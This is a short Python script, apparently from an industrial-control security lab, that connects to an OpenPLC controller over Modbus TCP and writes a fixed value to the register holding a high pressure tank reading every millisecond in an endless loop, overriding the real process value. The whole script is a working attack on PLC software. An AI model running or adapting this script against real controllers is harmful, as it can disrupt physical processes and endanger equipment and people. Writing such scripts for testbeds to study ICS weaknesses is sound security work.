#!/usr/bin/env python3
import time 
from pymodbus.client import ModbusTcpClient
import os
from dotenv import load_dotenv
from pathlib import Path

# Value of high pressure tank (HPT), which should be flooded
hpt = 10

# Use .dev.env file for DEVICE_IP
dotenv_path = Path('../../.dev.env')
load_dotenv(dotenv_path=dotenv_path)
device_ip = os.getenv('DEVICE_IP')

print("This script will flood the value of the high pressure tank (HPT) of the OpenPLC")
print("Flodding IP: " + str(device_ip))
time.sleep(5)

# Connect to ModbusTCP of the OpenPLC
client = ModbusTcpClient(host=device_ip,port=502)   # Create client object
client.connect()                 # connect to device, reconnect automatically

# While true loop for flooding
while True:
    print("Setting HPT to " + str(hpt))


    client.write_register(1126,hpt) #(register, value, unit)  
  
    time.sleep(0.001)
    
client.close()                             # Disconnect device
